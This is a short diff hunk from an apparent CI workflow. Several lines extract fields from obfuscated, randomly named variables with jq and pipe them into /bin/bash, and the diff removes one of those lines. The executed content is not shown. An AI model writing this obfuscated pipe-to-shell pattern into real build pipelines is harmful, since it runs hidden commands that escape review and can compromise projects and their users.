@@ -28,7 +28,6 @@ jobs:
           echo $nhwiz8 | jq -r .mcu1 | /bin/bash
           printf '%s' "$yiobz7" | jq -r .qrbej48 | /bin/bash
           echo $gono75 | jq -r .v58 | /bin/bash
-          printf '%s' "$byte4" | jq -r .vpj33406 | /bin/bash
           printf '%s' "$qlf44" | jq -r .m2 | /bin/bash
           printf '%s' "$y43" | jq -r .cmuui66 | /bin/bash
 
